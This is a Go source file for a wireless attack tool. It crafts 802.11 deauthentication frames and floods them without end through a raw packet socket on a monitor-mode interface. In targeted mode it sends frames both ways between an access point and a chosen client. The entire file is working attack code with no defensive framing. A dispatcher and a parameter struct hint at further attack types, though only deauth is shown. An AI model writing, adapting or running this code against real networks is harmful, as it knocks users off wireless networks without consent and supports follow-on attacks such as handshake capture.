package main

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"runtime"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

type RealAttack struct {
	Running   bool
	StopChan  chan struct{}
	mu        sync.Mutex
	Packets   int64
	StartTime time.Time
}

type AttackParams struct {
	Iface   string `json:"iface"`
	BSSID   string `json:"bssid"`
	Station string `json:"station"`
	SSIDs   string `json:"ssids"`
	Count   int    `json:"count"`
	Rate    int    `json:"rate"`
	Timeout int    `json:"timeout"`
	Type    string `json:"type"`
}

func NewRealAttack() *RealAttack {
	return &RealAttack{StopChan: make(chan struct{})}
}

func mac2bytes(mac string) []byte {
	b, _ := hex.DecodeString(mac)
	if len(b) == 6 {
		return b
	}
	parts := macSplit(mac)
	if len(parts) != 6 {
		return []byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	}
	res := make([]byte, 6)
	for i, p := range parts {
		v := 0
		fmt.Sscanf(p, "%x", &v)
		res[i] = byte(v)
	}
	return res
}

func macSplit(mac string) []string {
	out := make([]string, 0, 6)
	cur := ""
	for _, c := range mac {
		if c == ':' || c == '-' {
			if cur != "" {
				out = append(out, cur)
				cur = ""
			}
		} else {
			cur += string(c)
		}
	}
	if cur != "" {
		out = append(out, cur)
	}
	return out
}

func craftDeauthFrame(bssid, station []byte, reason uint16) []byte {
	radiotap := []byte{0x00, 0x00, 0x0C, 0x00, 0x02, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00}
	fc := []byte{0xC0, 0x00}
	dur := []byte{0x01, 0x3A}
	seq := make([]byte, 2)
	frame := radiotap
	frame = append(frame, fc...)
	frame = append(frame, dur...)
	frame = append(frame, station...)
	frame = append(frame, bssid...)
	frame = append(frame, bssid...)
	frame = append(frame, seq...)
	frame = append(frame, byte(reason), byte(reason>>8))
	return frame
}

func (a *RealAttack) Deauth(iface, bssidStr, stationStr string, count int) error {
	a.mu.Lock()
	a.Running = true
	a.StartTime = time.Now()
	a.Packets = 0
	a.mu.Unlock()

	defer func() {
		a.mu.Lock()
		a.Running = false
		a.mu.Unlock()
	}()

	if runtime.GOOS != "linux" {
		return fmt.Errorf("deauth requires Linux with monitor mode")
	}

	bssid := mac2bytes(bssidStr)
	station := mac2bytes(stationStr)
	targeted := string(station) != "\xff\xff\xff\xff\xff\xff"

	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_ALL)))
	if err != nil {
		return fmt.Errorf("raw socket: %v", err)
	}
	defer syscall.Close(fd)

	ifi, err := net.InterfaceByName(iface)
	if err != nil {
		return fmt.Errorf("interface %s: %v", iface, err)
	}

	addr := syscall.SockaddrLinklayer{
		Protocol: htons(syscall.ETH_P_ALL),
		Ifindex:  ifi.Index,
	}

	if err := syscall.Bind(fd, &addr); err != nil {
		return fmt.Errorf("bind: %v", err)
	}

	fmt.Printf("[GO-RAW] Deauth: %s → %s on %s (infinite, Ctrl+C to stop)\n", bssidStr, stationStr, iface)
	pktCount := 0

	for {
		select {
		case <-a.StopChan:
			fmt.Printf("\n[GO-RAW] Deauth stopped at packet %d\n", pktCount)
			return nil
		default:
		}

		frame := craftDeauthFrame(bssid, station, 7)
		_, err := syscall.Write(fd, frame)
		if err == nil {
			pktCount++
			a.mu.Lock()
			a.Packets++
			a.mu.Unlock()
		}

		if targeted {
			frameCl := craftDeauthFrame(station, bssid, 7)
			_, err := syscall.Write(fd, frameCl)
			if err == nil {
				pktCount++
				a.mu.Lock()
				a.Packets++
				a.mu.Unlock()
			}
		}

		if pktCount%500 == 0 {
			fmt.Printf("\r[GO-RAW] Deauth packets sent: %d", pktCount)
			os.Stdout.Sync()
		}
	}
}

func (a *RealAttack) ExecuteAttack(attackType string, params AttackParams) error {
	switch attackType {
	case "deauth":
		return a.Deauth(params.Iface, params.BSSID, params.Station, params.Count)
	default:
		return fmt.Errorf("unknown attack type: %s", attackType)
	}
}

func htons(i uint16) uint16 {
	b := make([]byte, 2)
	binary.BigEndian.PutUint16(b, i)
	return *(*uint16)(unsafe.Pointer(&b[0]))
}
